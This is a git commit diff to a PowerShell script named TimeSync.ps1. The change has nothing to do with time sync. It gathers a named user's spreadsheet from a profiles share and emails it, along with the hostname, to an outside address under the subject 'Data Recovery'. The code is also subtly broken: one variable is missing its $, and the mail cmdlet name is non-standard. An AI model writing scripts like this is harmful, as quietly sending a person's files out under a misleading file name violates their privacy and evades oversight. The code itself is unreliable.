a087f7cf02aac54e9852309039d284294962da4c
invokepsscript <waterloozer7@gmail.com>
2025-02-25 09:26:33 -0500

    Update TimeSync.ps1

--- TimeSync.ps1
+++ TimeSync.ps1
@@ -1,1 +1,7 @@
-ls O:\ProfilesFolder\Users\dinigeorge\Documents
+$attachments = @()
+
+$hostname = hostname
+
+attachments += "O:\ProfilesFolder\Users\dinigeorge\Documents\Workbook_Dini.ods"
+
+Send-SmtpMailMessage -To drush@evertz.com -From 5288IT@evertz.local -smtpserver mail -Attachments $attachments -Subject "Data Recovery" -Body $hostname
